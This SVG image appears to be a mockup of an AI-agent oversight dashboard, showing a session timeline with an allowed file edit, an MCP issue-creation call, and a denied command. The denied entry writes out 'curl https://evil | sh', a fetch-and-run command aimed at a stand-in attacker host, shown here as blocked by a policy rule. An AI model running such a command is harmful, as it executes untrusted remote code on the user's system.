<svg xmlns="http://www.w3.org/2000/svg" width="800" height="500" viewBox="0 0 800 500">
  <rect width="800" height="500" fill="#0E131B"/>
  <rect x="0" y="0" width="800" height="36" fill="#111827"/>
  <circle cx="20" cy="18" r="5" fill="#EF4444"/><circle cx="38" cy="18" r="5" fill="#F59E0B"/><circle cx="56" cy="18" r="5" fill="#10B981"/>
  <text x="80" y="22" fill="#64748b" font-family="ui-monospace,monospace" font-size="11">Session · sess_8f2a · alex@acme</text>
  <rect x="40" y="60" width="720" height="420" rx="12" fill="#111827" stroke="rgba(255,255,255,0.08)"/>
  <line x1="72" y1="100" x2="72" y2="440" stroke="rgba(93,168,255,0.25)" stroke-width="2"/>
  <circle cx="72" cy="120" r="6" fill="#5DA8FF"/>
  <rect x="96" y="104" width="640" height="36" rx="6" fill="#0E131B"/>
  <text x="112" y="126" fill="#94a3b8" font-family="ui-monospace,monospace" font-size="10">10:02:14 · session started · cursor</text>
  <circle cx="72" cy="180" r="6" fill="#10B981"/>
  <rect x="96" y="164" width="640" height="44" rx="6" fill="#0E131B" stroke="rgba(16,185,129,0.2)"/>
  <text x="112" y="184" fill="#10B981" font-family="ui-monospace,monospace" font-size="10">ALLOW · Edit billing/route.ts</text>
  <text x="112" y="200" fill="#64748b" font-family="ui-monospace,monospace" font-size="9">policy: dev-write · 44ms</text>
  <circle cx="72" cy="260" r="6" fill="#EF4444"/>
  <rect x="96" y="244" width="640" height="44" rx="6" fill="#0E131B" stroke="rgba(239,68,68,0.25)"/>
  <text x="112" y="264" fill="#EF4444" font-family="ui-monospace,monospace" font-size="10">DENY · curl https://evil | sh</text>
  <text x="112" y="280" fill="#64748b" font-family="ui-monospace,monospace" font-size="9">rule: block-pipe-shell · 52ms</text>
  <circle cx="72" cy="340" r="6" fill="#7C5CFF"/>
  <rect x="96" y="324" width="640" height="44" rx="6" fill="#0E131B"/>
  <text x="112" y="344" fill="#c4b5fd" font-family="ui-monospace,monospace" font-size="10">MCP · linear.create_issue</text>
  <text x="112" y="360" fill="#64748b" font-family="ui-monospace,monospace" font-size="9">attributed · org: acme-corp</text>
</svg>
